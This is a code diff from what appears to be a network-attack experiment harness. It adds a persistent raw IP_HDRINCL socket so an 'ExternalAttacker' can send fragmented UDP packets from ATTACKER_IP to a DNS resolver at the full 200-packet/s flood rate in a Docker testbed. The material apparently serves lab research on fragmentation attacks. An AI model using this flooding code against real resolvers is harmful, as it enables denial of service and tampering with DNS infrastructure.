@@ -31,6 +31,28 @@ POLICY = os.environ.get("POLICY_MODE", "unregistered")
 WORKLOAD = os.environ.get("WORKLOAD", "unregistered")
 
 
+class RawIPSender:
+    """Keep one IP_HDRINCL socket for the finite replay stream.
+
+    Scapy's top-level ``send`` helper creates and closes an L3 socket for
+    each call.  That overhead is material at the registered 200-packet/s
+    flood rate and made the replay deliver only about 25 packets/s in the
+    routed Docker testbed.  A persistent raw socket preserves the exact
+    serialized IPv4 fragments while allowing the schedule to be replayed at
+    its registered arrival times.
+    """
+
+    def __init__(self) -> None:
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+
+    def send(self, packet: Any) -> None:
+        self.socket.sendto(bytes(packet), (str(packet.dst), 0))
+
+    def close(self) -> None:
+        self.socket.close()
+
+
 class EventLog:
     def __init__(self) -> None:
         LOG_DIR.mkdir(parents=True, exist_ok=True)
@@ -69,7 +91,7 @@ def occupancy_payload(seq: int) -> bytes:
     return b"E5V2-OCCUPANCY-" + f"{seq:08d}".encode("ascii") + b"-" + (b"O" * 36)
 
 
-def send_occupancy(seq: int, ipid: int) -> int:
+def send_occupancy(seq: int, ipid: int, sender: RawIPSender) -> int:
     packets = fragment_udp_payload(
         src=ATTACKER_IP,
         dst=RESOLVER_IP,
@@ -79,7 +101,8 @@ def send_occupancy(seq: int, ipid: int) -> int:
         fragsize=FRAGSIZE,
         src_port=9,
     )
-    send(packets, verbose=0)
+    for packet in packets:
+        sender.send(packet)
     return len(packets)
 
 
@@ -140,25 +163,29 @@ class ExternalAttacker:
     def occupancy_loop(self) -> None:
         rows = self.schedule.get("occupancy", [])
         start = time.monotonic()
-        for row in rows:
-            target = start + float(row["at_s"])
-            while True:
-                remaining = target - time.monotonic()
-                if remaining <= 0:
-                    break
-                if self.stop_event.wait(min(remaining, 0.05)):
-                    return
-            try:
-                count = send_occupancy(int(row["seq"]), int(row["ipid"]))
-                self.log.write(
-                    "occupancy_send",
-                    seq=int(row["seq"]),
-                    ipid=int(row["ipid"]),
-                    fragment_count=count,
-                    at_s=float(row["at_s"]),
-                )
-            except Exception as exc:
-                self.log.write("occupancy_error", seq=int(row["seq"]), error=repr(exc))
+        sender = RawIPSender()
+        try:
+            for row in rows:
+                target = start + float(row["at_s"])
+                while True:
+                    remaining = target - time.monotonic()
+                    if remaining <= 0:
+                        break
+                    if self.stop_event.wait(min(remaining, 0.05)):
+                        return
+                try:
+                    count = send_occupancy(int(row["seq"]), int(row["ipid"]), sender)
+                    self.log.write(
+                        "occupancy_send",
+                        seq=int(row["seq"]),
+                        ipid=int(row["ipid"]),
+                        fragment_count=count,
+                        at_s=float(row["at_s"]),
+                    )
+                except Exception as exc:
+                    self.log.write("occupancy_error", seq=int(row["seq"]), error=repr(exc))
+        finally:
+            sender.close()
 
     def run(self) -> None:
         notify = threading.Thread(target=self.notify_loop, daemon=True)
